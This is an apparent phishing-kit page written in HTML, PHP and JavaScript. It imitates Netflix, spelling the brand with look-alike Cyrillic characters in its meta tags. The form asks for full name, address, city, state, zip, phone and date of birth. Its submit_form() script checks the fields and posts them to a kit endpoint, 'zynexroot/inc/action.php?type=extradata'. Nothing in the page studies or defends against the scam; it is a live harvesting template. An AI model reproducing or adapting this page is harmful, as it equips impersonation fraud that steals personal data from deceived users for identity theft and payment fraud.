...
<html lang="en" class="">
  <head>
    ...
    <meta content="Watch Nеtflіх movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more." name="description">
    ...
    <meta property="og:description" content="Watch Nеtflіх movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more.">
    <meta property="al:ios:url" content="nflx://www.Nеtflіх.com/signup/creditoption">
    ...
    <style data-emotion="default-ltr-cache 1720sfo" data-s="">
      ...
      @supports (-moz-appearance: none) {
        .default-ltr-cache-1720sfo input[data-autofill]~.bordecustom {
          background: rgb(255, 251, 199);
        }
      }
...
<h1 data-uia="stepTitle" class="default-ltr-cache-invtik e1gdp3hr2">
    <?php echo $translations['provideInformation']; ?>
</h1>
</div>
</div>
<div class="contextRow" data-uia="subtitle">
    <span id="" data-uia="">
        <?php echo $translations['enterInformationToContinue']; ?>
    </span>
</div>
...
.bordecustom {
  align-items: center;
  background: white;
  border: 1px solid black; /* Default border setting */
  border-radius: 5px; /* Adjusted to a smoother curve similar to the image */
  bottom: 0;
  color: transparent;
  display: flex;
  justify-content: center;
...
.default-ltr-cache-1720sfo input ~ .bordecustom {
  background: rgb(255, 255, 255);
  border-radius: 5px; /* Consistency in border radius */
  border: 1px solid rgb(128, 128, 128);
}

input:focus ~ .bordecustom,
select:focus ~ .bordecustom {
  outline: 1px solid #998585; /* Thicker black outline on focus */
  box-shadow: 0 0 0 3px rgba(0,0,0,0.2); /* Adding shadow for a glowing effect */
}

input:focus:not(:focus-visible) ~ .bordecustom,
select:focus:not(:focus-visible) ~ .bordecustom {
  outline: none;
}
                          ...
                          <ul class="simpleForm structural ui-grid inlineContainer">
                            ...
                            <li data-uia="field-firstName+wrapper" class="nfFormSpace">
							  ...
							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['fullName']; ?></label>
                                <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                  <input type="text" autocomplete="cc-name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="fullname" name="firstName" data-uia="field-name" value="">
                               ...
                               <div class="silvercard">
							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['address']; ?></label>
                                <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                  <input type="text" autocomplete="cc-name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="address" name="firstName" data-uia="field-name" value="">
                               ...
                               <div class="silvercard">
							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['city']; ?></label>
                                <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                  <input type="text" autocomplete="cc-name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="city" name="firstName" data-uia="field-name" value="">
                               ...
                               <div class="silvercard">
							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['state']; ?></label>
                                <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                  <input type="text" autocomplete="cc-name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="state" name="firstName" data-uia="field-name" value="">
                               ...
                               <div class="silvercard">
							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['zip']; ?></label>
                                <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                  <input type="text" autocomplete="cc-name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="zip" name="firstName" data-uia="field-name" value="">
                               ...
                               <div class="silvercard">
							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['phone']; ?></label>
                                <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                  <input type="text" autocomplete="cc-name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="phone" name="firstName" data-uia="field-name" value="">
                               ...
                               <div class="silvercard">
							  <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
                                <label for=":rb:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label"><?php echo $translations['dateOfBirth']; ?></label>
                                <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                  <input type="text" oninput="formatDOB(this)" autocomplete="cc-name" dir="ltr" placeholder="" class="input_nativeElementStyles__1euouia0" id="dob" name="firstName" data-uia="field-name" value="">
...
function formatDOB(input) {
  ...
  input.value = formattedValue;
                      ...
                      <div class="submitBtnContainer">
                        <button class="pressable_styles__a6ynkg0 button_styles__1kwr4ym0  default-ltr-cache-1071m8g e1ax5wel2" data-uia="action-submit-payment" dir="ltr" id="submit_button" onclick="submit_form()" type="button" ><?php echo $translations['nextButton']; ?></button>
                      </div>
...
<style>
.bordecustom-empty {
  border: 1px solid rgb(193, 17, 25) !important;
}
...
async function submit_form() {
    ...
    // Define inputs with corresponding IDs for direct border application
    const inputs = {
        fullname: { element: $('#fullname'), minLength: 2, borderId: '#borderfull' },
        address: { element: $('#address'), minLength: 5, borderId: '#borderadd' },
        city: { element: $('#city'), minLength: 2, borderId: '#bordercity' },
        state: { element: $('#state'), minLength: 2, borderId: '#borderstat' },
        zip: { element: $('#zip'), minLength: 3, borderId: '#borderzip' },
        phone: { element: $('#phone'), minLength: 5, borderId: '#borderphone' },
        dob: { element: $('#dob'), minLength: 8, borderId: '#borderdob' }
    };

    let isValid = true;
    Object.entries(inputs).forEach(([key, { element, minLength, borderId }]) => {
        const value = element.val()?.trim();
        if (!value || value.length < minLength) {
            $(borderId).css('border', '1px solid red'); // Apply red border directly to the element's border ID
            isValid = false;
        } else {
            $(borderId).css('border', ''); // Clear the border styling
        }
    });
    ...
    try {
        ...
        const response = await fetch('zynexroot/inc/action.php?type=extradata', {
            method: 'POST',
...
$('input').on('input change', function () {
    // Find corresponding border ID for this input
    const borderId = $(this).data('border-id');
    if (this.value.trim() !== '' && this.value.trim().length >= $(this).data('min-length')) {
